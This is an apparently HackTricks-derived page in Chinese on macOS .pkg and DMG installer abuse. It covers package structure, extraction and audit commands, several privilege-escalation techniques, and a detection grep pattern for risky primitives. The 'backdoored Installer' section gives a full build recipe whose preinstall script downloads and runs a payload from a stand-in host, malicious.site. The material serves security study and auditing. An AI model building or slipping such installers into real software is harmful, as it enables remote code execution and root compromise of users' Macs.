# macOS 安装包滥用

{{#include ../../../banners/hacktricks-training.md}}

## Pkg 基本信息

macOS **installer package**（也称为 `.pkg` 文件）是一种由 macOS 用于 **分发软件** 的文件格式。这些文件就像一个 **装着软件正常安装和运行所需全部内容的盒子**。

package 文件本身是一个归档，包含将被安装到目标计算机上的 **文件和目录层级结构**。它还可以包含用于在安装前后执行任务的 **scripts**，例如设置配置文件或清理旧版本软件。

### 层级结构

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: 自定义内容（标题、欢迎文本…）以及 script/installation 检查
- **PackageInfo (xml)**: 信息、安装要求、安装位置、要运行的 scripts 路径
- **Bill of materials (bom)**: 要安装、更新或移除的文件列表，以及文件权限
- **Payload (CPIO archive gzip compressed)**: 从 PackageInfo 中的 `install-location` 安装的文件
- **Scripts (CPIO archive gzip compressed)**: 在临时目录中提取并执行的安装前后 scripts 和更多资源。

### 解压
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
为了在不手动解压的情况下可视化安装程序的内容，你也可以使用免费工具 [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/)。

### 静态分拣快捷方式

如果目标是分析，尽量**不要先用 `Installer.app` 打开 package**。某些 package 在 Installer 打开时就可以立即执行代码（例如通过 `system.run()` 或 installer 插件），因此离线提取通常是更安全的起点。
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG 基本信息

DMG 文件，或 Apple Disk Images，是 Apple 的 macOS 使用的一种磁盘映像文件格式。DMG 文件本质上是一个**可挂载的磁盘映像**（它包含自己的文件系统），其中包含原始块数据，通常经过压缩，有时还会加密。打开 DMG 文件时，macOS 会**像挂载物理磁盘一样将其挂载**，从而让你访问其中的内容。

> [!CAUTION]
> 注意，**`.dmg`** 安装程序支持**非常多的格式**，因此过去其中一些存在漏洞的格式曾被滥用于获取**kernel code execution**。

### 层级结构

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG 文件的层级结构会根据其内容而不同。不过，对于 application DMG，它通常遵循如下结构：

- 顶层：这是磁盘映像的根目录。它通常包含应用程序，以及指向 Applications 文件夹的链接。
- Application (.app)：这是真正的应用程序。在 macOS 中，application 通常是一个 package，其中包含构成该应用程序的许多单独文件和文件夹。
- Applications Link：这是 macOS 中 Applications 文件夹的快捷方式。这样做的目的是让你更容易安装应用程序。你可以将 .app 文件拖到这个快捷方式上来安装应用。

## 通过 pkg abuse 提权

### 从公共目录执行

如果 pre 或 post installation script 例如从 **`/var/tmp/Installerutil`** 执行，并且攻击者可以控制该脚本，那么每次它被执行时都可以提升权限。另一个类似的例子：

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

这是一个[公共函数](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)，多个安装程序和更新程序都会调用它来**以 root 执行某些内容**。这个函数接受要执行的**文件**的**路径**作为参数，不过，如果攻击者能够**修改**该文件，他就可以**滥用**其 root 执行来**提权**。
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
有关更多信息，请查看这个 talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Environment and shebang abuse

现代 PackageKit bugs 表明，installer scripts 往往会作为**trusted root code** 执行，同时仍然保留 attacker-controlled context 在附近。在审计 vendor packages 时，特别要注意：

- Shell interpreters，例如 `#!/bin/zsh` / `#!/bin/bash`
- 诸如 `sudo -u $USER`、`launchctl asuser` 之类的调用，或者任何信任 `$USER`、`$HOME`、`PATH`、`TMPDIR` 或 relative paths 的逻辑
- 可能加载 user-controlled init files 或 libraries 的 non-shell interpreters
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
对于 2024 PackageKit root-environment bug（用户发起安装期间 `~/.zshenv` / `~/.bash*` 继承），请查看 [generic macOS privesc page](../macos-privilege-escalation.md)。如果该包是 **Apple-signed**，同样的脚本 bug 可能会变成 **SIP/TCC-relevant**，因为 `system_installd` 可能携带 `com.apple.rootless.install.heritable`；参见 [SIP page](../macos-security-protections/macos-sip.md)。

### Execution by mounting

如果安装程序会写入 `/tmp/fixedname/bla/bla`，就可以在 `/tmp/fixedname` 上**创建一个 mount**，并使用 noowners，这样你就可以在安装期间**修改任意文件**，以滥用安装过程。

一个例子是 **CVE-2021-26089**，它成功**覆盖了一个周期性脚本**，从而获得 root 执行权限。更多信息请查看演讲： [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

可以只生成一个带有**pre and post-install scripts**的 **`.pkg`** 文件，而不包含任何真实 payload，除了脚本中的 malware。

### JS in Distribution xml

可以在包的 **distribution xml** 文件中添加 **`<script>`** 标签，这些代码会被执行，并且可以使用 **`system.run`** 执行命令：

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

在 distribution 包中，这通常取决于顶层 `Distribution` 文件是否启用 external scripts，例如通过 `allow-external-scripts="true"`。因此，只检查 `preinstall` / `postinstall` 还不够：**Distribution XML 本身** 也可能包含 `installation-check` / `volume-check` hooks，以及直接的 `system.run()` / `system.runOnce()` 执行路径。
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### 被植入后门的 Installer

使用脚本和 dist.xml 内的 JS 代码的恶意 Installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
